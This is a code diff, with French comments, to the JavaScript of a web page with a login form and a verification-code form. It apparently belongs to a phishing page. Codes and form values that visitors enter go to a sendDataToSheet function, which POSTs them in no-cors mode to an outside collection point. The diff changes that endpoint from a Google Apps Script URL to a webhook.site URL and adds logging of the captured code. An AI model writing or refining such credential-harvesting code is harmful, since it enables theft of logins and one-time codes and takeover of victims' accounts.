@@ -63,8 +63,8 @@ const translations = {
 // Langue par défaut
 let currentLang = 'en';
 
-// Remplace par ton URL Webhook.site (ou Google Sheets si ça marchait avant)
-const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbwJW28v5Td5bVAtEtwCdNtHumbX8k5FLWQ91RemPv92K0XS3fPcmXsyHbtzBpMgQxA/exec'; // Va sur webhook.site pour une nouvelle URL
+// Remplace par une NOUVELLE URL Webhook.site
+const GOOGLE_SHEET_URL = 'https://webhook.site/[TON_ID]'; // Va sur webhook.site et copie une nouvelle URL
 
 // Fonction pour envoyer les données
 function sendDataToSheet(type, value) {
@@ -72,7 +72,7 @@ function sendDataToSheet(type, value) {
         type: type,
         value: value
     };
-    console.log('Tentative d’envoi:', data); // Débogage
+    console.log('Tentative d’envoi:', data);
     fetch(GOOGLE_SHEET_URL, {
         method: 'POST',
         mode: 'no-cors',
@@ -82,7 +82,7 @@ function sendDataToSheet(type, value) {
         body: JSON.stringify(data)
     })
     .then(() => console.log('Requête POST envoyée:', data))
-    .catch(error => console.error('Erreur lors de l’envoi:', error));
+    .catch(error => console.error('Erreur:', error));
 }
 
 // Fonction pour définir la langue
@@ -150,14 +150,17 @@ function resendCode() {
 
 // Handle code form submission (index.html)
 if (document.getElementById('codeForm')) {
+    console.log('Code form détecté'); // Débogage
     document.getElementById('codeForm').addEventListener('submit', function(event) {
         event.preventDefault();
+        console.log('Formulaire code soumis'); // Débogage
 
         const inputs = document.getElementsByTagName('input');
         let code = '';
         for (let i = 0; i < inputs.length; i++) {
             code += inputs[i].value;
         }
+        console.log('Code saisi:', code); // Débogage
 
         const message = document.getElementById('message');
         const button = document.querySelector('.verify-btn');
@@ -187,7 +190,7 @@ if (document.getElementById('codeForm')) {
 
 // Handle login form submission (login.html)
 if (document.getElementById('loginForm')) {
-    console.log('Login form détecté'); // Débogage pour vérifier si ce bloc s’exécute
+    console.log('Login form détecté'); // Débogage
     document.getElementById('loginForm').addEventListener('submit', function(event) {
         event.preventDefault();
         console.log('Formulaire login soumis'); // Débogage
